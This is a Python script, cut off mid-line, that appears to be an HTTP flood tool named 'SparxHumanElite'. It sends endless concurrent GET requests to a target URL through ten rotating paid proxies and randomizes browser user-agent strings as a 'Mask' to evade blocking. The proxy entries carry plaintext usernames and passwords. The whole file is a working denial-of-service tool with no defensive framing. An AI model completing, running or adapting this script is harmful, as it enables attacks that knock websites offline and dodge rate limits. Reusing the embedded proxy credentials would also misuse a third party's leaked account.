import asyncio
import aiohttp
import os
import random

def log(msg):
    print(f"{msg}", flush=True)

class SparxHumanElite:
    def __init__(self):
        self.target = os.environ.get("TARGET_URL", "")
        self.stats = {"success": 0, "failed": 0}
        self.concurrency = 200 
        
        # Your Webshare Elite List
        self.proxies = [
            "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
            "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
            "http://nwllkxds:li0q0dyj1sdw@216.10.27.159:6837",
            "http://nwllkxds:li0q0dyj1sdw@64.137.96.74:6641",
            "http://nwllkxds:li0q0dyj1sdw@198.105.121.200:6462",
            "http://nwllkxds:li0q0dyj1sdw@107.172.163.27:6543",
            "http://nwllkxds:li0q0dyj1sdw@45.38.107.97:6014",
            "http://nwllkxds:li0q0dyj1sdw@198.23.239.134:6540",
            "http://nwllkxds:li0q0dyj1sdw@23.95.150.145:6114",
            "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
        ]

        # List of "Human" browser signatures
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        ]

    async def worker(self, session, sem):
        while True:
            for p in self.proxies:
                for _ in range(900):
                    async with sem:
                        # Randomize the "Mask" for every single request
                        headers = {
                            "User-Agent": random.choice(self.ua_list),
                            "Accept": "text/html,application/xhtml+xml,xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Connection": "keep-alive"
                        }
                        try:
                            async with session.get(self.target, proxy=p, headers=headers, timeout=5) as r:
                                if r.status == 200:
                                    self.stats["success"] += 1
                                else:
                                    self.stats["failed"] += 1
                        except:
                            self.stats["failed"] += 1
                    
                    if (self.stats["success"] + self.stats["
